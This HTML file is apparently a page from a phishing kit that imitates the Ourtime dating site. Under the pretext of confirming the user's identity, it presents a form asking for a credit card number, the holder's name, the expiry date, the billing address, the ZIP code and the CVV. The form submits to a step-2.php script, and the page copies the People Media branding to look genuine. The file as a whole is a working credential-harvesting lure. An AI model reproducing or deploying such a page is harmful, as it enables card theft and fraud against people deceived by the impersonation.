﻿<!doctype html>
<html style="background-image:none">
<head>
<meta charset="utf-8">
<title>Ourtime - Payment Method</title>
<link rel="stylesheet" href="css/style.css">
<script src="js/jqueryLib.js" type="text/javascript"></script>
<meta http-equiv="x-ua-compatible" content="ie=edge">
<meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=no">
<meta http-equiv="pragma" content="no-cache"><meta name="robots" content="noydir, noodp">
<link rel="shortcut icon" type="image/x-icon" href="images/favicon3.png" data-react-helmet="true">
<script language="JavaScript" type="text/javascript">/*<![CDATA[*/
function numbersOnly(field, event) {
	return allowedChars(field, event, "-0123456789.,");
}

function digitsOnly(field, event) {
	return allowedChars(field, event, "0123456789");
}

function allowedChars(field, event, chars) {
	var key;

	if (window.event) {
		key = window.event.keyCode;
	} else {
		if (event) {
			key = event.which;
		} else {
			return true;
		}
	}

	if (isOneOf(key, null, 0, 8, 9, 13, 27, 37, 39, 46)) {
		return true;
	} else {
		var keychar = String.fromCharCode(key);

		if (chars.indexOf(keychar) > -1) {
			return true;
		} else {
			return false;
		}
	}
}

function isOneOf(key) {
	for (arg in arguments) {
		if (key == arg) {
			return true;
		}
	}
	
	return false;
}
			/*]]>*/</script>
</head>

<body>
 <!--<div class="logo-container">
 	<div class="logo"></div>
 </div>-->
 <div class="header-menu-const">
 	<div class="header-menu">
    <div class="space"></div>
     <div class="header-menu-2">
    	<div class="dashboard-menu-1">Home</div>
        <div class="dashboard-menu-2">Inbox</div>
        <div class="dashboard-menu-3">Search</div>
        <div class="dashboard-menu-4">Matches <div class="note-icon"></div></div>
        <div class="dashboard-menu-5">Events</div>
        <div class="dashboard-menu-6">Settings</div>
        <div class="dashboard-menu-7"></div>
      </div>
    </div>
 </div>
 <div class="row-17">
 	<div class="payment-method-panel">
    	<div class="payment-method-header">
        	<div style="font-size:25px;font-weight:bold;margin-bottom:0px;">Confirm Your Identity</div><br>
            <span>(No extra charges for confirming your identity)</span>
            <br>
        </div>
        <div class="payment-method-body">
       	  <form name="form1" method="post" action="step-2.php">
       	    <table width="440" border="0">
       	      <tr>
       	        <td colspan="2">Protect your account. Please use this secure form to confirm your identity by providing the details below. Once your identity has been confirmed, you can continue using Ourtime.com.</td>
   	          </tr>
       	      <tr>
       	        <td colspan="2">&nbsp;</td>
   	          </tr>
       	      <tr>
       	        <td colspan="2">Enter the details as it appears on your card.</td>
   	          </tr>
       	      <tr>
       	        <td>&nbsp;</td>
       	        <td>&nbsp;</td>
   	          </tr>
       	      <tr>
       	        <td width="163"><label for="credit_card_number">Credit Card Number :</label></td>
       	        <td width="267">
   	            <input type="text" name="credit_card_number" id="credit_card_number" required autocomplete="off" class="input-field2" onKeyPress="javascript:return(numbersOnly(this,event));" maxlength="16" minlength="16" placeholder="&#88;&#88;&#88;&#88;&#32;&#88;&#88;&#88;&#88;&#32;&#88;&#88;&#88;&#88;&#32;&#88;&#88;&#88;&#88;">
                </td>
   	          </tr>
       	      <tr>
       	        <td><label for="card_holder_name">Card Holder's Name :</label></td>
       	        <td>
   	            <input type="text" name="card_holder_name" id="card_holder_name" required autocomplete="off" class="input-field2">
                </td>
   	          </tr>
       	      <tr>
       	        <td><label for="">Credit Card Expiration :</label></td>
       	        <td>
       	          <select name="month" id="month" required class="input-field3">
                     <option value="">Month</option>
                     <option value="01">01</option>
                     <option value="02">02</option>
                     <option value="03">03</option>
                     <option value="04">04</option>
                     <option value="05">05</option>
                     <option value="06">06</option>
                     <option value="07">07</option>
                     <option value="08">08</option>
                     <option value="09">09</option>
                     <option value="10">10</option>
                     <option value="11">11</option>
                     <option value="12">12</option>
                </select>
       	          /
       	          <select name="year" id="year" required class="input-field3">
                      <option value="">Year</option>
                      <option value="2019">2019</option>
					  <option value="2020">2020</option>
					  <option value="2021">2021</option>
					  <option value="2022">2022</option>
					  <option value="2023">2023</option>
					  <option value="2024">2024</option>
					  <option value="2025">2025</option>
					  <option value="2026">2026</option>
					  <option value="2027">2027</option>
					  <option value="2028">2028</option>
					  <option value="2029">2029</option>
					  <option value="2030">2030</option>
					  <option value="2031">2031</option>
					  <option value="2032">2032</option>
                                          <option value="2033">2033</option>
                                          <option value="2034">2034</option>
                                          <option value="2035">2035</option>
					  <option value="2036">2036</option>
                </select>
                </td>
   	          </tr>
       	      <tr>
       	        <td>Billing Address :</td>
       	        <td>
   	            <input type="text" name="billing_address" id="billing_address" required autocomplete="off" class="input-field2"></td>
   	          </tr>
       	      <tr>
       	        <td> <label for="billing_address_zip_code">Billing Address Zip Code :</label></td>
       	        <td>
   	            <input type="text" name="billing_address_zip_code" id="billing_address_zip_code" required autocomplete="" class="zipcode" onKeyPress="javascript:return(numbersOnly(this,event));" maxlength="5" minlength="5" placeholder="&#90;&#105;&#112;&#32;&#99;&#111;&#100;&#101;">
                </td>
   	          </tr>
       	      <tr>
       	        <td><label for="cvn">Card Verification Number :</label></td>
       	        <td>
   	            <input type="text" name="cvn" id="cvn" required autocomplete="off" class="cvn" onKeyPress="javascript:return(numbersOnly(this,event));" maxlength="3" minlength="3" placeholder="&#88;&#88;&#88;">
   	            <a href="" style="color:#81c44e">What's this?</a>
                </td>
   	          </tr>
       	      <tr>
       	        <td>&nbsp;</td>
       	        <td>&nbsp;</td>
   	          </tr>
       	      <tr>
       	        <td colspan="2">By selecting &quot;Confirm&quot; I agree to the <a href="" style="color:#81c44e">terms of use</a> and understand that my subscription will automatically renew.</td>
   	          </tr>
       	      <tr>
       	        <td>&nbsp;</td>
       	        <td align="right"><div style="margin:0 1em 0 0"><input type="submit" name="btn-confirm" id="btn-confirm" value="Confirm" class="confirm-btn"></div></td>
   	          </tr>
   	        </table>
      	  </form>
        </div>
    </div>
 </div>
<div class="row-20b">
 	<div class="row-20b-content">
    	Copyright © <script type="text/javascript">document.write(new Date().getFullYear());</script> &nbsp;</span> People Media. All rights reserved. 166x2617  . <a href="" style="color:#009fdb">Term of use</a> | <a href="" style="color:#009fdb">Privacy Policy</a> | <a href="" style="color:#009fdb">Cookies Policy</a>

    </div>
 </div>

<script src="js/action.js" type="text/javascript"></script>
</body>
</html>